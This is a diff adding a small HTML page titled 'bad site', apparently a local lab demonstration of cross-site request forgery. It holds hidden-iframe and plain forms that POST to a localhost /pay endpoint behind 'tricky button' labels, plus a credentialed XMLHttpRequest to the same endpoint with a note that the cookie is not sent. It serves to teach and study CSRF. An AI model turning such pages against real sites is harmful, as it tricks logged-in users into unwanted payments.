@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>bad site</title>
+</head>
+<body>
+<iframe name="csrf-iframe"></iframe>
+<form action="http://127.0.0.1:9999/pay" method="post" target="csrf-iframe">
+    <input type="submit" value="tricky button - iframe hidden"/>
+</form>
+
+<form action="http://127.0.0.1:9999/pay" method="post" target="/">
+    <input type="submit" value="tricky button"/>
+</form>
+
+<p>alternative: javascript XMLHTTPREQUEST:
+    Request is done but the cookie is not sent due to
+</p>
+
+<script>
+    var xhr = new XMLHttpRequest();
+    xhr.withCredentials = true; // has no effect
+    xhr.open("POST", "http://127.0.0.1:9999/pay", true);
+    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+    xhr.onload = () => console.log(this);
+    xhr.send();
+</script>
+</body>
+</html>
